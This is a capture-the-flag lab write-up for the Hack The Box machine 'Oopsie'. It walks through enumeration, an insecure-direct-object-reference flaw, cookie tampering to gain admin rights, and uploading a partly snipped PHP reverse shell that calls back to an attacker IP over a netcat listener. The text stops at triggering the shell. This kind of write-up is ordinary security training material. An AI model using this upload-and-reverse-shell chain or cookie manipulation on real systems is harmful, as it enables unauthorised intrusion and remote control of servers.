---
hidden: true
---

# Oopsie

## Enumeration

`nmap -p- 10.129.95.191 -sC -sV -v --min-rate 5000`

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see that port 22 and port 80 are open. We'll open the web browser and search for the ip and lets check the website out for any vulnerabilities.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Initially we see that, it doesnt lead us to anywhere but then when you scroll down...theres a hint

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

By this, we can confirm that there's a login page but before we proceed with directory and page enumeration. we can try to map the website by using BurpSuite proxy\
\
I've used BurpSuite and this is the resultant sitemap\
<br>

<figure><img src="../../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

here, the [http://10.129.95.191/](http://10.129.95.191/)cdn-cgi/login/script.js is very interesting.

we can visit this on out browser...lets go ahead

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

i tried brute forcing manually but sadly no results but theres also an option to login as guest...lets go ahead and try that&#x20;

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

As we can see...theres an uploads section...lets go ahead and check that out

<figure><img src="../../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

we need super admin rights for that...we need to surely escalate our privileges...lets try by checking the cookies and try manipulating them...

i went to inspect the page and i see that we are logged in as guest and out user value is 2233 and its possible that if we find the user value of super admin we can escalate...

<figure><img src="../../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>



I checked the browser for url where there's id in the url...we can try changing the value of id to enumerate

<figure><img src="../../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

\
and yee we found it and the id is 1...this info disclosure vuln...lets see if we can succeed...now lets see if we can change the values for user and role

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

i changed the values and now we can upload the file...



## Foothold

Now that we got access to the upload form we can attempt to upload a PHP reverse shell.

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only. Users take full responsibility
// for any actions performed using this tool. The author accepts no liability
// for damage caused by this tool. If these terms are not acceptable to you,
then
// do not use this tool.
//
<SNIP>
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.140'; // CHANGE THIS WITH YOUR IP
$port = 4444; // CHANGE THIS WITH YOUR LISTENING PORT
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
<SNIP>
?>
```

<figure><img src="../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

i've uploaded the php file now lets use gobuster to find the directory so that we can implement reverse shell...

```
gobuster dir --url http://10.129.95.191/ --wordlist
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

The gobuster immediately found the /uploads directory. We don't have permission to access\
the directory but we can try access our uploaded file.

I've setup the netcat connection.

<figure><img src="../../../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

Then request our shell through the browser or curl
